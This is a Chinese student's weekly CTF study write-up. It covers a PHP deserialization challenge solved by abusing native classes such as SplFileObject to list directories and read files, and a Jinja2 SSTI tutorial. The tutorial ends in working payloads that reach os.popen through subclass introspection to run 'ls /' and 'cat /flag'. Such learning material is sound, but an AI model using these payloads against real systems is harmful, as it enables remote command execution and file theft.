---
title: web本周学习总结
---

# 总结

###### 复现了两道题，同时对相应的知识做了学习

#### dasctf的ezunserlize

参加了比赛，不过发现自己就是过去划水的，一道题都搞不出来（手动尴尬）。

看了wp，复现一下反序列化那道题

这是第一次遇到用原生类的题

题目：

```
<?php
error_reporting(0);
highlight_file(__FILE__);

class A{
    public $class;
    public $para;
    public $check;
    public function __construct()
    {
        $this->class = "B";
        $this->para = "ctfer";
        echo new  $this->class ($this->para);
    }
    public function __wakeup()
    {
        $this->check = new C;
        if($this->check->vaild($this->para) && $this->check->vaild($this->class)) {
            echo new  $this->class ($this->para);
        }
        else
            die('bad hacker~');
    }

}
class B{
    var $a;
    public function __construct($a)
    {
        $this->a = $a;
        echo ("hello ".$this->a);
    }
}
class C{

    function vaild($code){
        $pattern = '/[!|@|#|$|%|^|&|*|=|\'|"|:|;|?]/i';
        if (preg_match($pattern, $code)){
            return false;
        }
        else
            return true;
    }
}


if(isset($_GET['pop'])){
    unserialize($_GET['pop']);
}
else{
    $a=new A;

}  hello ctfer
```



看了writeup才知道是有可以读取文件的原生类的

![](https://tcakalr.gitee.io/tc/微信图片_20210331205139.png)

![微信图片_202103312051391](https://tcakalr.gitee.io/tc/微信图片_202103312051391.png)

### 一.可遍历目录类

DirectoryIterator
FilesystemIterator

GlobIterator 与上面略不同，该类可以通过模式匹配来寻找文件路径。

### 二.可读取文件类

SplFileObject 在此函数中，URL 可作为文件名，不过也要受到allow_url_fopen影响。

 官方文档allow_url_fopen是这么写的。

```
    allow_url_fopen     boolean    

​      本选项激活了 URL 形式的 fopen 封装协议使得可以访问 URL      对象例如文件。默认的封装协议提供用 ftp 和 http 协议来访问[远程文件](https://www.php.net/manual/zh/features.remote-files.php)，一些扩展库例如      [zlib](https://www.php.net/manual/zh/ref.zlib.php) 可能会注册更多的封装协议。
```

​     就是允许fopen这样的函数打开url



读取/var/www/html

![微信图片_202103312051392](https://tcakalr.gitee.io/tc/微信图片_202103312051392.png)

![微信图片_202103312051393](https://tcakalr.gitee.io/tc/微信图片_202103312051393.png)

再读取flag

![微信图片_202103312051394](https://tcakalr.gitee.io/tc/微信图片_202103312051394.png)

#### ssti基础学习

通过buu上面的一道题学习一下ssti一些基础知识

模板的基本语法：

官方文档对于模板的语法介绍如下

    {% ... %} for Statements
     
    {{ ... }} for Expressions to print to the template output
     
    {# ... #} for Comments not included in the template output
     
    #  ... ## for Line Statements

这几个东西有什么用呢？

- `{%%}`

  用于声明变量或者写入条件语句和循环语句

  ```
  {%set a='tc'%}
  ```

  这里用一道题目来看看（题目来源于buu[fake google]）

  ![](https://tcakalr.gitee.io/tc/微信图片_20210331112343.png)

  可以看到a变量被赋值为tc了。

  ![](https://tcakalr.gitee.io/tc/微信图片_202103311123431.png)

  接下来看看条件语句

  ```
  {%if 100==10*10%}yes{%endif%}
  ```

  ![](https://tcakalr.gitee.io/tc/微信图片_202103311123432.png)

  可以看到当if语句为true时，会输出中间的yes

  ![](https://tcakalr.gitee.io/tc/微信图片_202103311123433.png)

  循环语句

  ```
  {% for i in ['a','b','c'] %}tc{%endfor%}
  ```

  连续输出对应数量的tc

  ![](https://tcakalr.gitee.io/tc/微信图片_202103311123434.png)

  ![](https://tcakalr.gitee.io/tc/微信图片_202103311123435.png)

- `{{}}`

  常用来判断模板使用

  例如

  ```
  {{7*7}}#输出49
  ```

![](https://tcakalr.gitee.io/tc/微信图片_202103311123436.png)

- 常见的魔术方法

__class__

用于返回对象所属的类

    Python 3.7.8
    >>> ''.__class__
    <class 'str'>
    >>> ().__class__
    <class 'tuple'>
    >>> [].__class__
    <class 'list'>

__base__

以字符串的形式返回一个类所继承的类

__bases__

以元组的形式返回一个类所继承的类

__mro__

返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类

    Python 3.7.8
    >>> class Father():
    ...     def __init__(self):
    ...             pass
    ...
    >>> class GrandFather():
    ...     def __init__(self):
    ...             pass
    ...
    >>> class son(Father,GrandFather):
    ...     pass
    ...
    >>> print(son.__base__)
    <class '__main__.Father'>
    >>> print(son.__bases__)
    (<class '__main__.Father'>, <class '__main__.GrandFather'>)
    >>> print(son.__mro__)
    (<class '__main__.son'>, <class '__main__.Father'>, <class '__main__.GrandFather'>, <class 'object'>)
    
    __subclasses__()

获取类的所有子类

__init__

所有自带带类都包含init方法，常用他当跳板来调用globals

__globals__

会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合init使用



- 基本的攻击思路

  第一步是拿到内置类对应的类

  这里用到 `__class__`  获取

  ```
  ().__class__#<class 'tuple'>
  [].__class__#<class 'list'>
  {}.__class__#<class 'dict'>
  "".__class__#<class 'str'>
  ''.__class__#<class 'str'>
  ```

  第二步

  拿到object基类

  这里有三种方法

  用__bases__[0]拿到基类

      ''.__class__.__bases__[0]
      <class 'object'>

  用__base__拿到基类

      ''.__class__.__base__
      <class 'object'>

  用__mro__[1]或者__mro__[-1]拿到基类

      ''.__class__.__mro__[1]
      <class 'object'>
      ''.__class__.__mro__[-1]
      <class 'object'>

  第三步

  用__subclasses__()拿到子类列表

  ```
  ''.__class__.__bases__[0].__subclasses__()
  可以得到一大堆子类
  ```

  ![](https://tcakalr.gitee.io/tc/微信图片_202103311123437.png)

  ![](https://tcakalr.gitee.io/tc/微信图片_202103311123438.png)

  然后就要找到可以getshell的类

  然后写入payload

- 找类这步就要用到脚本了

  这里是直接找到一个网上的脚本

  ```
  import json
  
  a = """
  <class 'type'>,...,<class 'subprocess.Popen'>
  """
  
  num = 0
  allList = []
  
  result = ""
  for i in a:
      if i == ">":
          result += i
          allList.append(result)
          result = ""
      elif i == "n" or i == ",":
          continue
      else:
          result += i
          
  for k,v in enumerate(allList):
      if "os._wrap_close" in v:
          print(str(k)+"--->"+v)
  ```

  再倒回刚刚那题fake google

  查找到第117个类可以利用

  ![](https://tcakalr.gitee.io/tc/微信图片_202103311123439.png)

  那么调用`__globals__`

  写payload

  ```php
  {{().__class__.__bases__[0].__subclasses__()[117].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls /').read()")}}
  ```

执行ls命令

![](https://tcakalr.gitee.io/tc/微信图片_2021033111234310.png)

然后就可以读取flag

```
{{().__class__.__bases__[0].__subclasses__()[117].__init__.__globals__.__builtins__['eval']("__import__('os').popen('cat /flag').read()")}}
```

![](https://tcakalr.gitee.io/tc/微信图片_2021033111234311.png)

#### 另外

看到入门提纲里写着web入门最好去写一个基于数据库的学生信息管理系统，这周除做题外都在学习PHP+mysql，PHP有相当一部分没有学习的语法已经补回了很多，mysql也会在下周进行学习（也是为了可以学好sql注入），会尽力去写那个系统。